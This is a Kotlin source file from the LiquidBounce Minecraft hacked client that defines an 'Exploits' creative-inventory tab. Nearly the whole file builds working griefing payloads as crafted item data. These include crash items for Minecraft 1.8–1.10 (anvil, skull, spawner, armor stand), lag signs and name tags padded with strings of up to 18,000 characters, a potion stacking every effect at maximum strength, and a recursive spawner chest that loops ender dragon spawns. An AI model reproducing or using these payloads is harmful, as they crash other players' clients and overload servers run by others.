/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.tabs

import net.ccbluex.liquidbounce.api.enums.BlockType
import net.ccbluex.liquidbounce.api.enums.ItemType
import net.ccbluex.liquidbounce.api.minecraft.item.IItem
import net.ccbluex.liquidbounce.api.minecraft.item.IItemStack
import net.ccbluex.liquidbounce.api.util.WrappedCreativeTabs
import net.ccbluex.liquidbounce.injection.backend.WrapperImpl.classProvider
import net.ccbluex.liquidbounce.utils.item.ItemUtils

class ExploitsTab : WrappedCreativeTabs("Exploits")
{

	/**
	 * Initialize of exploits tab
	 */
	init
	{
		representedType.backgroundImageName = "item_search.png"
	}

	/**
	 * Add all items to tab
	 *
	 * @param itemList list of tab items
	 */
	override fun displayAllReleventItems(itemList: MutableList<IItemStack>)
	{
		val provider = classProvider

		// Create troll potion
		val trollPotion = provider.createItemStack(provider.getItemEnum(ItemType.POTION_ITEM))

		trollPotion.itemDamage = 16395

		val trollPotionEffects = provider.createNBTTagList()

		(1..27).map {
			val effect = provider.createNBTTagCompound()
			effect.setInteger("Amplifier", Integer.MAX_VALUE)
			effect.setInteger("Duration", Integer.MAX_VALUE)
			effect.setInteger("Id", it)
			effect
		}.forEach(trollPotionEffects::appendTag)

		trollPotion.setTagInfo("CustomPotionEffects", trollPotionEffects)
		trollPotion.setStackDisplayName("\u00A7c\u00A7lTroll\u00A76\u00A7lPotion")
		itemList.add(trollPotion)

		// Create kill potion
		val killPotion = provider.createItemStack(provider.getItemEnum(ItemType.POTION_ITEM))
		killPotion.itemDamage = 16395
		val effect = provider.createNBTTagCompound()
		effect.setInteger("Amplifier", 125)
		effect.setInteger("Duration", 2000)
		effect.setInteger("Id", 6)
		val effects = provider.createNBTTagList()
		effects.appendTag(effect)
		killPotion.setTagInfo("CustomPotionEffects", effects)
		killPotion.setStackDisplayName("\u00A7c\u00A7lKill\u00A76\u00A7lPotion")
		itemList.add(killPotion)

		// Create crash anvil for mc 1.8
		val crashAnvil = provider.createItemStack(provider.getBlockEnum(BlockType.ANVIL))
		crashAnvil.setStackDisplayName("\u00A78Crash\u00A7c\u00A7lAnvil \u00A77| \u00A7cmc1.8-mc1.8")
		crashAnvil.itemDamage = 16384
		itemList.add(crashAnvil) // Create crashhead for mc 1.10

		// Create crash head for mc 1.8 ~ 1.10
		val crashHead = provider.createItemStack(provider.getItemEnum(ItemType.SKULL))
		val compound = provider.createNBTTagCompound()
		compound.setString("SkullOwner", " ")
		crashHead.tagCompound = compound
		crashHead.setStackDisplayName("\u00A78Crash\u00A76\u00A7lHead \u00A77| \u00A7cmc1.8-mc1.10")
		itemList.add(crashHead)

		// Add crash spawner
		ItemUtils.createItem("mob_spawner 1 0 {BlockEntityTag:{EntityId:\"Painting\"}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Crash\u00A7c\u00A7lSpawner \u00A77| \u00A7cmc1.8-mc1.8")) }

		// Create crashstand for mc 1.10
		ItemUtils.createItem("armor_stand 1 0 {EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Crash\u00A72\u00A7lStand \u00A77| \u00A7cmc1.10")) }

		// TODO: Make a fix for it (Make LagSign and LagTag doesn't work for me)
		// Create lag sign (LiquidBounce type)
		ItemUtils.createItem("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"$lagString\\\"}\",Text2:\"{\\\"text\\\":\\\"$lagString\\\"}\",Text3:\"{\\\"text\\\":\\\"$lagString\\\"}\",Text4:\"{\\\"text\\\":\\\"$lagString\\\"}\"}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Lag\u00A72\u00A7lSign (Type A) \u00A77| \u00A7cmc1.8")) }

		// Create lag sign (WURST type)
		ItemUtils.createItem("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"$lagString2\\\"}\",Text2:\"{\\\"text\\\":\\\"$lagString2\\\"}\",Text3:\"{\\\"text\\\":\\\"$lagString2\\\"}\",Text4:\"{\\\"text\\\":\\\"$lagString2\\\"}\"}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Lag\u00A72\u00A7lSign (Type B) \u00A77| \u00A7cmc1.8")) }

		// Create spawn eggs of special mobs
		ItemUtils.createItem("spawn_egg 1 64")?.let(itemList::add)
		ItemUtils.createItem("spawn_egg 1 63")?.let(itemList::add)
		ItemUtils.createItem("spawn_egg 1 53")?.let(itemList::add)

		// Create lag tag (LiquidBounce type)
		ItemUtils.createItem("name_tag 1 0 {display:{Name: \"$lagString\"}}")?.let(itemList::add)

		// Create lag tag (WURST type)
		ItemUtils.createItem("name_tag 1 0 {display:{Name: \"$lagString2\"}}")?.let(itemList::add)

		// Create infinity firework
		ItemUtils.createItem("fireworks 1 0 {HideFlags:63,Fireworks:{Flight:127b,Explosions:[0:{Type:0b,Trail:1b,Colors:[16777215,],Flicker:1b,FadeColors:[0,]}]}}")?.let { itemList.add(it.setStackDisplayName("\u00A7cInfinity \u00A7a\u00A7lFirework")) }

		// Create enderdragon loop item
		ItemUtils.createItem("chest 1 0 {BlockEntityTag:{Items:[0:{Slot:0b, id:\"minecraft:mob_spawner\",Count:64b,tag:{BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"EnderDragon\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s}],value:\"Chest\",Lock:\"\"}}")?.setStackDisplayName("\u00A7c\u00A7lEnder\u00A7c\u00A7a\u00A7lDragon \u00A7bSpawner Chest")?.let(itemList::add)
	}

	/**
	 * Return icon item of tab
	 *
	 * @return icon item
	 */
	override fun getTabIconItem(): IItem
	{
		val provider = classProvider

		return provider.createItemStack(provider.getItemEnum(ItemType.POTION_ITEM)).item!!
	}

	/**
	 * Return name of tab
	 *
	 * @return tab name
	 */
	override fun getTranslatedTabLabel() = "Exploits"

	/**
	 * @return searchbar status
	 */
	override fun hasSearchBar() = true

	companion object
	{
		val lagString: String // LiquidBounce type
		val lagString2: String // WURST type

		init
		{
			val lagStringBuilder = StringBuilder(16500)
			val lagStringBuilder2 = StringBuilder(18000)

			repeat(500) { lagStringBuilder.append("/(!\u00A7()%/\u00A7)=/(!\u00A7()%/\u00A7)=/(!\u00A7()%/\u00A7)=") }
			repeat(18000) { lagStringBuilder2.append('#') }

			lagString = "$lagStringBuilder"
			lagString2 = "$lagStringBuilder2"
		}
	}
}
